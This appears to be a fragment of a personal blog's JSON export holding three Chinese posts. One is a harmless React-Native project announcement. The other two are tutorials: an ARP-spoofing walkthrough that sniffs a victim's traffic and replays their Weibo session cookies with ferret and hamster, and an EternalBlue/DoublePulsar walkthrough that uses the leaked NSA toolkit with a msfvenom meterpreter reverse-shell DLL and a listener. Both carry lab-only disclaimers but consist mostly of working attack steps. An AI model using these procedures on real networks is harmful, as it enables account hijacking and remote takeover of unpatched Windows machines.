sudo aptitude install ferret-sidejack:i386\n\n\n### 攻击\n\n首先arp走一波，前面的文章我有介绍到ettercap，今天这里介绍一个小巧的arp工具。arpspoof \n\n * arpspoof -i eth0 -t 192.168.1.1 192.168.1.101\n * -i 网卡名\n * -t 网关和受害者ip\n\n![](/images/pasted-83.jpg)\n\n\n然后使用tcpdump来捕获数据包。\n * tcpdump -i eth0 -w data.cap\n * -i 网卡名\n * -w 保存的数据包\n\n![](/images/pasted-84.jpg)\n\n**这个时候受害者登录微博。**\n\n\n这个时候数据包中的数据都是受害者的网络请求数据，其中包含着cookies.\n\n然后使用ferret来处理数据包。\n\n * ferret -r data.cap\n\n![](/images/pasted-85.jpg)\n\n\n处理完成后会在本地生成一个hamster.txt文件。\n\n然后运行hamster。\n\n![](/images/pasted-86.jpg)\n\n我们需要打开设置代理。\n\n![](/images/pasted-80.jpg)\n\n设置完成后，打开浏进入127.0.0.1:1234，这时候里面的数据都是受害者的所有网络请求数据，包含着登录信息。找到登录后的信息。\n\n![](/images/pasted-87.jpg)\n\n劫持成功。\n\n![](/images/pasted-82.jpg)\n\n同时也可以发微博\n\n![](/images/pasted-81.jpg)","source":"_posts/diary-2017-0415-02.md","raw":"---\nlayout: post\ntitle: 内网王者之会话劫持\ndate: 2017-04-15 01:02:14\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。<!--more-->\n\n受害者\n ![](/images/pasted-63.PNG)\n\n攻击者\n ![](/images/pasted-64.PNG)\n\n\n### 环境\n\n用到的工具\n\n * ferret \n * tcpdump \n * Hamster\n\n其中ferret没有64位的，如果用的64位系统，需要安卓32位的ferret，而32位自带ferret。\n\n添加对32位应用程序的支持\n\n * dpkg --add-architecture i386\n\n安装32位ferret\n\n * sudo aptitude install ferret-sidejack:i386\n\n\n### 攻击\n\n首先arp走一波，前面的文章我有介绍到ettercap，今天这里介绍一个小巧的arp工具。arpspoof \n\n * arpspoof -i eth0 -t 192.168.1.1 192.168.1.101\n * -i 网卡名\n * -t 网关和受害者ip\n\n![](/images/pasted-83.jpg)\n\n\n然后使用tcpdump来捕获数据包。\n * tcpdump -i eth0 -w data.cap\n * -i 网卡名\n * -w 保存的数据包\n\n![](/images/pasted-84.jpg)\n\n**这个时候受害者登录微博。**\n\n\n这个时候数据包中的数据都是受害者的网络请求数据，其中包含着cookies.\n\n然后使用ferret来处理数据包。\n\n * ferret -r data.cap\n\n![](/images/pasted-85.jpg)\n\n\n处理完成后会在本地生成一个hamster.txt文件。\n\n然后运行hamster。\n\n![](/images/pasted-86.jpg)\n\n我们需要打开设置代理。\n\n![](/images/pasted-80.jpg)\n\n设置完成后，打开浏进入127.0.0.1:1234，这时候里面的数据都是受害者的所有网络请求数据，包含着登录信息。找到登录后的信息。\n\n![](/images/pasted-87.jpg)\n\n劫持成功。\n\n![](/images/pasted-82.jpg)\n\n同时也可以发微博\n\n![](/images/pasted-81.jpg)","slug":"diary-2017-0415-02","published":1,"updated":"2017-06-09T17:11:27.085Z","photos":[],"link":"","_id":"cjvhjxaau000kiny2fw9rx0qe","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。<a id=\"more\"></a></p>\n</blockquote>\n<p>受害者<br> <img src=\"/images/pasted-63.PNG\" alt></p>\n<p>攻击者<br> <img src=\"/images/pasted-64.PNG\" alt></p>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><p>用到的工具</p>\n<ul>\n<li>ferret </li>\n<li>tcpdump </li>\n<li>Hamster</li>\n</ul>\n<p>其中ferret没有64位的，如果用的64位系统，需要安卓32位的ferret，而32位自带ferret。</p>\n<p>添加对32位应用程序的支持</p>\n<ul>\n<li>dpkg –add-architecture i386</li>\n</ul>\n<p>安装32位ferret</p>\n<ul>\n<li>sudo aptitude install ferret-sidejack:i386</li>\n</ul>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><p>首先arp走一波，前面的文章我有介绍到ettercap，今天这里介绍一个小巧的arp工具。arpspoof </p>\n<ul>\n<li>arpspoof -i eth0 -t 192.168.1.1 192.168.1.101</li>\n<li>-i 网卡名</li>\n<li>-t 网关和受害者ip</li>\n</ul>\n<p><img src=\"/images/pasted-83.jpg\" alt></p>\n<p>然后使用tcpdump来捕获数据包。</p>\n<ul>\n<li>tcpdump -i eth0 -w data.cap</li>\n<li>-i 网卡名</li>\n<li>-w 保存的数据包</li>\n</ul>\n<p><img src=\"/images/pasted-84.jpg\" alt></p>\n<p><strong>这个时候受害者登录微博。</strong></p>\n<p>这个时候数据包中的数据都是受害者的网络请求数据，其中包含着cookies.</p>\n<p>然后使用ferret来处理数据包。</p>\n<ul>\n<li>ferret -r data.cap</li>\n</ul>\n<p><img src=\"/images/pasted-85.jpg\" alt></p>\n<p>处理完成后会在本地生成一个hamster.txt文件。</p>\n<p>然后运行hamster。</p>\n<p><img src=\"/images/pasted-86.jpg\" alt></p>\n<p>我们需要打开设置代理。</p>\n<p><img src=\"/images/pasted-80.jpg\" alt></p>\n<p>设置完成后，打开浏进入127.0.0.1:1234，这时候里面的数据都是受害者的所有网络请求数据，包含着登录信息。找到登录后的信息。</p>\n<p><img src=\"/images/pasted-87.jpg\" alt></p>\n<p>劫持成功。</p>\n<p><img src=\"/images/pasted-82.jpg\" alt></p>\n<p>同时也可以发微博</p>\n<p><img src=\"/images/pasted-81.jpg\" alt></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。","more":"</p>\n</blockquote>\n<p>受害者<br> <img src=\"/images/pasted-63.PNG\" alt></p>\n<p>攻击者<br> <img src=\"/images/pasted-64.PNG\" alt></p>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><p>用到的工具</p>\n<ul>\n<li>ferret </li>\n<li>tcpdump </li>\n<li>Hamster</li>\n</ul>\n<p>其中ferret没有64位的，如果用的64位系统，需要安卓32位的ferret，而32位自带ferret。</p>\n<p>添加对32位应用程序的支持</p>\n<ul>\n<li>dpkg –add-architecture i386</li>\n</ul>\n<p>安装32位ferret</p>\n<ul>\n<li>sudo aptitude install ferret-sidejack:i386</li>\n</ul>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><p>首先arp走一波，前面的文章我有介绍到ettercap，今天这里介绍一个小巧的arp工具。arpspoof </p>\n<ul>\n<li>arpspoof -i eth0 -t 192.168.1.1 192.168.1.101</li>\n<li>-i 网卡名</li>\n<li>-t 网关和受害者ip</li>\n</ul>\n<p><img src=\"/images/pasted-83.jpg\" alt></p>\n<p>然后使用tcpdump来捕获数据包。</p>\n<ul>\n<li>tcpdump -i eth0 -w data.cap</li>\n<li>-i 网卡名</li>\n<li>-w 保存的数据包</li>\n</ul>\n<p><img src=\"/images/pasted-84.jpg\" alt></p>\n<p><strong>这个时候受害者登录微博。</strong></p>\n<p>这个时候数据包中的数据都是受害者的网络请求数据，其中包含着cookies.</p>\n<p>然后使用ferret来处理数据包。</p>\n<ul>\n<li>ferret -r data.cap</li>\n</ul>\n<p><img src=\"/images/pasted-85.jpg\" alt></p>\n<p>处理完成后会在本地生成一个hamster.txt文件。</p>\n<p>然后运行hamster。</p>\n<p><img src=\"/images/pasted-86.jpg\" alt></p>\n<p>我们需要打开设置代理。</p>\n<p><img src=\"/images/pasted-80.jpg\" alt></p>\n<p>设置完成后，打开浏进入127.0.0.1:1234，这时候里面的数据都是受害者的所有网络请求数据，包含着登录信息。找到登录后的信息。</p>\n<p><img src=\"/images/pasted-87.jpg\" alt></p>\n<p>劫持成功。</p>\n<p><img src=\"/images/pasted-82.jpg\" alt></p>\n<p>同时也可以发微博</p>\n<p><img src=\"/images/pasted-81.jpg\" alt></p>"},{"layout":"post","title":"React-Native狗狗说项目+NodeJs服务器","date":"2017-04-21T14:26:15.000Z","comments":1,"_content":"\n#### 前言\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习React-Native中的一个小项目，录制视频和音频，然后去掉视频中的声音，再把无声音的视频和录的音频合并，项目用的ES6语法。同时主页使用了rap和mock数据测试框架。\n\n用到了第三方组件有\n * react-native-video\n * react-native-sound\n * react-native-image-picker\n * react-native-audio\n * react-native-vector-icons\n等等一些其他第三方组件。\n支持同步上传到七牛和cloudinary网盘中。\n\n服务器端使用的是NodeJs，express4框架。同时使用了luosimao短信验证码平台。\n\nencoding......\n\n客户端\n * [https://github.com/Y00z/react-navie_dogSpeak](https://github.com/Y00z/react-navie_dogSpeak)\n\n服务端\n * [https://github.com/Y00z/react-navie_dogSpeak_service](https://github.com/Y00z/react-navie_dogSpeak_service)","source":"_posts/diary-2017-0421-01.md","raw":"---\nlayout: post\ntitle: React-Native狗狗说项目+NodeJs服务器\ndate: 2017-04-21 22:26:15\ncomments: true\ntags:\n\t- React-Native\n\t- NodeJs\n\t- 开源\n---\n\n#### 前言\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习React-Native中的一个小项目，录制视频和音频，然后去掉视频中的声音，再把无声音的视频和录的音频合并，项目用的ES6语法。同时主页使用了rap和mock数据测试框架。\n\n用到了第三方组件有\n * react-native-video\n * react-native-sound\n * react-native-image-picker\n * react-native-audio\n * react-native-vector-icons\n等等一些其他第三方组件。\n支持同步上传到七牛和cloudinary网盘中。\n\n服务器端使用的是NodeJs，express4框架。同时使用了luosimao短信验证码平台。\n\nencoding......\n\n客户端\n * [https://github.com/Y00z/react-navie_dogSpeak](https://github.com/Y00z/react-navie_dogSpeak)\n\n服务端\n * [https://github.com/Y00z/react-navie_dogSpeak_service](https://github.com/Y00z/react-navie_dogSpeak_service)","slug":"diary-2017-0421-01","published":1,"updated":"2017-05-04T08:33:15.069Z","photos":[],"link":"","_id":"cjvhjxaaw000liny20ddm82v8","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习React-Native中的一个小项目，录制视频和音频，然后去掉视频中的声音，再把无声音的视频和录的音频合并，项目用的ES6语法。同时主页使用了rap和mock数据测试框架。</p>\n<p>用到了第三方组件有</p>\n<ul>\n<li>react-native-video</li>\n<li>react-native-sound</li>\n<li>react-native-image-picker</li>\n<li>react-native-audio</li>\n<li>react-native-vector-icons<br>等等一些其他第三方组件。<br>支持同步上传到七牛和cloudinary网盘中。</li>\n</ul>\n<p>服务器端使用的是NodeJs，express4框架。同时使用了luosimao短信验证码平台。</p>\n<p>encoding……</p>\n<p>客户端</p>\n<ul>\n<li><a href=\"https://github.com/Y00z/react-navie_dogSpeak\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react-navie_dogSpeak</a></li>\n</ul>\n<p>服务端</p>\n<ul>\n<li><a href=\"https://github.com/Y00z/react-navie_dogSpeak_service\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react-navie_dogSpeak_service</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习React-Native中的一个小项目，录制视频和音频，然后去掉视频中的声音，再把无声音的视频和录的音频合并，项目用的ES6语法。同时主页使用了rap和mock数据测试框架。</p>\n<p>用到了第三方组件有</p>\n<ul>\n<li>react-native-video</li>\n<li>react-native-sound</li>\n<li>react-native-image-picker</li>\n<li>react-native-audio</li>\n<li>react-native-vector-icons<br>等等一些其他第三方组件。<br>支持同步上传到七牛和cloudinary网盘中。</li>\n</ul>\n<p>服务器端使用的是NodeJs，express4框架。同时使用了luosimao短信验证码平台。</p>\n<p>encoding……</p>\n<p>客户端</p>\n<ul>\n<li><a href=\"https://github.com/Y00z/react-navie_dogSpeak\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react-navie_dogSpeak</a></li>\n</ul>\n<p>服务端</p>\n<ul>\n<li><a href=\"https://github.com/Y00z/react-navie_dogSpeak_service\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react-navie_dogSpeak_service</a></li>\n</ul>\n"},{"layout":"post","title":"微软末日:黑掉全球70%电脑的0day","date":"2017-04-15T12:41:27.000Z","comments":1,"_content":"\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天凌晨网络上发生了一波核弹级爆炸，影子经纪人黑客组织(Shadow Brokers)又一次公布了方程式黑客组织（Equation Group）的武器库。方程式据称是美国安全局(NSA)下属的组织。\n\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，造成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。\n<!--more-->\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的exp，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。\n\nps:这个文章其实可以早一些时间发出来，我这个电脑12年入手的到现在已经跟随了我5年时间，开3个虚拟机太特么卡了，实验到一半就卡死重启，这让我换mbp的心更坚定了。\n\n### 环境\n * python2.6.6/32位\n * pywin32-221.win32-py2.6\n\n靶机 win7\n![](/images/pasted-69.jpg)\n\n攻击者1\n![](/images/pasted-70.jpg)\n\n攻击者2\n![](/images/pasted-71.jpg)\n\n### 配置\n\n下载解压后切换到windows目录执行python fb.py\n**\n默认选项参数特别多，我这里只说重要需要填写的参数**\n\n输入靶机ip和攻击者ip以及选择是否开启本地监听。\n\n![](/images/pasted-72.jpg)\n\n创建一个工程项目，名字随意\n\n![](/images/pasted-73.jpg)\n\n选择模块，选择Eternalblue模块，输入use Eternalblue\n\n![](/images/pasted-74.jpg)\n\n一路回车选择默认的配置，然后到了这一步我们选择目标的系统，以及攻击方式\n\n![](/images/pasted-75.jpg)\n\n然后继续一路回车选择默认的配置，直到我们看到了这个 success 就说明成功了。\n\n![](/images/pasted-76.jpg)\n\n接下来继续选择攻击方式模块，选择Doublepulsar模块， 输入use Doublepulsar，\n继续一路回车，然后到这一步选择攻击的服务和目标系统的位数以及攻击方式\n\n![](/images/pasted-77.jpg)\n\n然后选择运行我们的payload文件，我们用msf来生成payload文件，在前面的安卓后门一章中也有讲过生成payload。\n\n    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5554 -f dll > s.dll\n\n如果电脑是32位的就去掉x64/，默认生成的就是32位的\n\n然后再启动配置msf，并监听反弹的shell。\n```shell\n    msf > use exploit/multi/handle\n    msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_Tcp\n    msf exploit(handler) > set LHOST 192.168.1.102\n    msf exploit(handler) > set LPORT 5554\n```\n\n选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。\n\n![](/images/pasted-78.jpg)\n\n再来看看我们监听的反弹shell\n\n![](/images/pasted-79.jpg)\n\n成功反弹，喜大普奔。\n\n### 结尾\n> 可惜我没有服务器，只能做做内网测试。与此同时公布漏洞的十多个小时中，微软终于出了补丁[(点我)](https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/)\n> 并且把此漏洞定为编号MS17-010，win10以下系统更新补丁后的windows将不受影响。\n\n### 总结\n> 这个NSA的武器库，不需要做任何操作，只要是联网的，就可以做到指哪儿打哪儿，把远程溢出攻击简化成如此简单。这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，然而每年各种黑客国际大会比赛几乎都是中国拿的冠军，原来是美国黑客压根就没参加。\n> ps：这个武器库和msf很像，但是感觉没有msf好用，默认选项太多，也许是msf用习惯了吧。\n\n下载地址：\n> * [https://github.com/x0rz/EQGRP_Lost_in_Translation](https://github.com/x0rz/EQGRP_Lost_in_Translation)","source":"_posts/diary-2017-0415-03.md","raw":"---\nlayout: post\ntitle: '微软末日:黑掉全球70%电脑的0day'\ndate: 2017-04-15 20:41:27\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天凌晨网络上发生了一波核弹级爆炸，影子经纪人黑客组织(Shadow Brokers)又一次公布了方程式黑客组织（Equation Group）的武器库。方程式据称是美国安全局(NSA)下属的组织。\n\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，造成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。\n<!--more-->\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的exp，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。\n\nps:这个文章其实可以早一些时间发出来，我这个电脑12年入手的到现在已经跟随了我5年时间，开3个虚拟机太特么卡了，实验到一半就卡死重启，这让我换mbp的心更坚定了。\n\n### 环境\n * python2.6.6/32位\n * pywin32-221.win32-py2.6\n\n靶机 win7\n![](/images/pasted-69.jpg)\n\n攻击者1\n![](/images/pasted-70.jpg)\n\n攻击者2\n![](/images/pasted-71.jpg)\n\n### 配置\n\n下载解压后切换到windows目录执行python fb.py\n**\n默认选项参数特别多，我这里只说重要需要填写的参数**\n\n输入靶机ip和攻击者ip以及选择是否开启本地监听。\n\n![](/images/pasted-72.jpg)\n\n创建一个工程项目，名字随意\n\n![](/images/pasted-73.jpg)\n\n选择模块，选择Eternalblue模块，输入use Eternalblue\n\n![](/images/pasted-74.jpg)\n\n一路回车选择默认的配置，然后到了这一步我们选择目标的系统，以及攻击方式\n\n![](/images/pasted-75.jpg)\n\n然后继续一路回车选择默认的配置，直到我们看到了这个 success 就说明成功了。\n\n![](/images/pasted-76.jpg)\n\n接下来继续选择攻击方式模块，选择Doublepulsar模块， 输入use Doublepulsar，\n继续一路回车，然后到这一步选择攻击的服务和目标系统的位数以及攻击方式\n\n![](/images/pasted-77.jpg)\n\n然后选择运行我们的payload文件，我们用msf来生成payload文件，在前面的安卓后门一章中也有讲过生成payload。\n\n    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5554 -f dll > s.dll\n\n如果电脑是32位的就去掉x64/，默认生成的就是32位的\n\n然后再启动配置msf，并监听反弹的shell。\n```shell\n    msf > use exploit/multi/handle\n    msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_Tcp\n    msf exploit(handler) > set LHOST 192.168.1.102\n    msf exploit(handler) > set LPORT 5554\n```\n\n选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。\n\n![](/images/pasted-78.jpg)\n\n再来看看我们监听的反弹shell\n\n![](/images/pasted-79.jpg)\n\n成功反弹，喜大普奔。\n\n### 结尾\n> 可惜我没有服务器，只能做做内网测试。与此同时公布漏洞的十多个小时中，微软终于出了补丁[(点我)](https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/)\n> 并且把此漏洞定为编号MS17-010，win10以下系统更新补丁后的windows将不受影响。\n\n### 总结\n> 这个NSA的武器库，不需要做任何操作，只要是联网的，就可以做到指哪儿打哪儿，把远程溢出攻击简化成如此简单。这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，然而每年各种黑客国际大会比赛几乎都是中国拿的冠军，原来是美国黑客压根就没参加。\n> ps：这个武器库和msf很像，但是感觉没有msf好用，默认选项太多，也许是msf用习惯了吧。\n\n下载地址：\n> * [https://github.com/x0rz/EQGRP_Lost_in_Translation](https://github.com/x0rz/EQGRP_Lost_in_Translation)","slug":"diary-2017-0415-03","published":1,"updated":"2017-06-07T07:12:40.211Z","photos":[],"link":"","_id":"cjvhjxaaw000miny2ao3imsr9","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天凌晨网络上发生了一波核弹级爆炸，影子经纪人黑客组织(Shadow Brokers)又一次公布了方程式黑客组织（Equation Group）的武器库。方程式据称是美国安全局(NSA)下属的组织。</p>\n</blockquote>\n<blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，造成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。<br><a id=\"more\"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的exp，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。</p>\n</blockquote>\n<p>ps:这个文章其实可以早一些时间发出来，我这个电脑12年入手的到现在已经跟随了我5年时间，开3个虚拟机太特么卡了，实验到一半就卡死重启，这让我换mbp的心更坚定了。</p>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><ul>\n<li>python2.6.6/32位</li>\n<li>pywin32-221.win32-py2.6</li>\n</ul>\n<p>靶机 win7<br><img src=\"/images/pasted-69.jpg\" alt></p>\n<p>攻击者1<br><img src=\"/images/pasted-70.jpg\" alt></p>\n<p>攻击者2<br><img src=\"/images/pasted-71.jpg\" alt></p>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><p>下载解压后切换到windows目录执行python fb.py<br><strong><br>默认选项参数特别多，我这里只说重要需要填写的参数</strong></p>\n<p>输入靶机ip和攻击者ip以及选择是否开启本地监听。</p>\n<p><img src=\"/images/pasted-72.jpg\" alt></p>\n<p>创建一个工程项目，名字随意</p>\n<p><img src=\"/images/pasted-73.jpg\" alt></p>\n<p>选择模块，选择Eternalblue模块，输入use Eternalblue</p>\n<p><img src=\"/images/pasted-74.jpg\" alt></p>\n<p>一路回车选择默认的配置，然后到了这一步我们选择目标的系统，以及攻击方式</p>\n<p><img src=\"/images/pasted-75.jpg\" alt></p>\n<p>然后继续一路回车选择默认的配置，直到我们看到了这个 success 就说明成功了。</p>\n<p><img src=\"/images/pasted-76.jpg\" alt></p>\n<p>接下来继续选择攻击方式模块，选择Doublepulsar模块， 输入use Doublepulsar，<br>继续一路回车，然后到这一步选择攻击的服务和目标系统的位数以及攻击方式</p>\n<p><img src=\"/images/pasted-77.jpg\" alt></p>\n<p>然后选择运行我们的payload文件，我们用msf来生成payload文件，在前面的安卓后门一章中也有讲过生成payload。</p>\n<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5554 -f dll &gt; s.dll\n</code></pre><p>如果电脑是32位的就去掉x64/，默认生成的就是32位的</p>\n<p>然后再启动配置msf，并监听反弹的shell。<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf &gt; use exploit/multi/handle</span><br><span class=\"line\">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_Tcp</span><br><span class=\"line\">msf exploit(handler) &gt; set LHOST 192.168.1.102</span><br><span class=\"line\">msf exploit(handler) &gt; set LPORT 5554</span><br></pre></td></tr></table></figure></p>\n<p>选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。</p>\n<p><img src=\"/images/pasted-78.jpg\" alt></p>\n<p>再来看看我们监听的反弹shell</p>\n<p><img src=\"/images/pasted-79.jpg\" alt></p>\n<p>成功反弹，喜大普奔。</p>\n<h3 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h3><blockquote>\n<p>可惜我没有服务器，只能做做内网测试。与此同时公布漏洞的十多个小时中，微软终于出了补丁<a href=\"https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/\" target=\"_blank\" rel=\"noopener\">(点我)</a><br>并且把此漏洞定为编号MS17-010，win10以下系统更新补丁后的windows将不受影响。</p>\n</blockquote>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><blockquote>\n<p>这个NSA的武器库，不需要做任何操作，只要是联网的，就可以做到指哪儿打哪儿，把远程溢出攻击简化成如此简单。这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，然而每年各种黑客国际大会比赛几乎都是中国拿的冠军，原来是美国黑客压根就没参加。<br>ps：这个武器库和msf很像，但是感觉没有msf好用，默认选项太多，也许是msf用习惯了吧。</p>\n</blockquote>\n<p>下载地址：</p>\n<blockquote>\n<ul>\n<li><a href=\"https://github.com/x0rz/EQGRP_Lost_in_Translation\" target=\"_blank\" rel=\"noopener\">https://github.com/x0rz/EQGRP_Lost_in_Translation</a></li>\n</ul>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天凌晨网络上发生了一波核弹级爆炸，影子经纪人黑客组织(Shadow Brokers)又一次公布了方程式黑客组织（Equation 